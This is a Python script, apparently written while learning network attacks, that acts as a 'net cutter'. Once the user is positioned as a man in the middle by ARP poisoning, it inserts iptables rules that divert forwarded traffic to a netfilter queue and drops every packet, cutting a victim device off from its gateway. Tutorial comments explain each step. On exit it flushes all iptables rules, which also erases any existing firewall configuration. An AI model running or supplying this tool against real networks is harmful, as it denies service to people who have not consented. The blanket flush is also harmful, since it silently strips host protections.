#!/usr/bin/env python3
import argparse
import subprocess
import sys
import netfilterqueue


# First we need to know well what we are doing,
# We have our arp_spoof so,
# we can capture the traffic between the victim and the gateway.
# We now need to intercept these packets and drop them instead it arrives its destination.
# scapy help us to :
# 1. create packets
# 2. analyze packets
# 3. send/receive packets
# but not INTERCEPT packets
# Our main goal is to capture the packet, modify it, transmit our modified version .
# To achieve that we need to make a trap that will delay the real version of the packet,
# so our modified version will be sent and processed first.
# To create that trap we need to create a queue and trap in it the original packets.
# So we will use a tool called iptables to modify the routing rules.
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.usage = u"This tool will cuts the traffic between a device and its gateway" \
                   u"\nNote: YOU SHOULD APPLY ARP POISONING ATTAK TO BE MITM\nDeveloped By (BigTrader) \u2620\ufe0f"
    parser.add_argument("-i", "--interface", dest="interface",
                        help="The interface you want to use in the attack", required=True)
    parser.add_argument("-l", "--local", dest="local",
                        help="Set it to 1 if you are testing on your local machine")

    arguments = parser.parse_args()

    return arguments


def create_forward_rule(interface):
    create_rule = ["sudo", "iptables", "-I", "FORWARD", "-i",
                   interface, "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(create_rule)


""""
The  command inserts a rule into the FORWARD chain of the firewall configuration
and specifically applies it to the given interface. Let's break down the command and its implications:

1. iptables: The command-line tool used for configuring the netfilter firewall rules in the Linux kernel.

2.-I: Indicates that we want to insert a new rule into the chain.

3. FORWARD: Specifies the name of the chain where the rule will be inserted. In this case,
 it is the FORWARD chain responsible for forwarding packets between different network interfaces.

4. -i : Specifies the input interface to which the rule will apply.

5. -j NFQUEUE: Specifies the target of the rule. It sets the target to NFQUEUE,
indicating that packets matching this rule will be sent to a userspace queue for further processing.

6. --queue-num 0: Specifies the queue number to which the packets will be sent.
In this case, the queue number is set to 0.

With this command, any packets that are forwarded through the FORWARD chain and match
the input interface will be redirected to the specified userspace queue (0) for further
processing by a userspace program.

Note that this will only trap the coming traffic from other devices,
To make it trap the traffic on your device so you need to create rules 
for the  OUTPUT and INPUT chains .
"""


# ---------------------------------------------------------------
#                   On The Local Machine
# ---------------------------------------------------------------
def create_input_chain_rule():
    command = ["sudo", "iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


def create_output_chain_rule():
    command = ["sudo", "iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"]
    subprocess.run(command)


# ---------------------------------------------------------------


# To delete the created rule of the firewall configuration
def delete_chain_rules():
    command = ["sudo", "iptables", "--flush"]
    subprocess.run(command)


packets_count = 0


# Let's create the function that will operate on each packet in the queue

def process_packet(packet):
    global packets_count
    packets_count += 1
    print(f"\rPackets Dropped: {packets_count} ", end="")
    # To accept the packet and let it go to its destination
    # packet.accept()
    # To drop the packet
    packet.drop()


def main():
    arguments = get_arguments()
    interface = arguments.interface
    local = arguments.local

    if str(local) == "1":
        create_output_chain_rule()
        create_input_chain_rule()
    else:
        create_forward_rule(interface)
    # Now any traffic FORWARDED through/to the given interface will be trapped in the created queue number
    # So, to access this queue we will use a module called "netfilterqueue"
    # Lets create an object of it to interact with the trap queue
    queue = netfilterqueue.NetfilterQueue()
    # To let this object interact with the queue we will call a method called bind, and give it
    # 1. the queue number that we h'v created
    # 2. a function to be run on each packet in the queue ,so bind is (Higher Order Function)
    try:
        print(u"[+] Net Cutting Started \u2620\ufe0f")
        queue.bind(0, process_packet)
        queue.run()  # To start the processing
    except KeyboardInterrupt:
        delete_chain_rules()
        sys.exit("\n[x] Attack Stopped")
    except Exception as e:
        delete_chain_rules()
        sys.exit(f"\n[-] An unexpected error occurred: {str(e)} ")


if __name__ == '__main__':
    main()
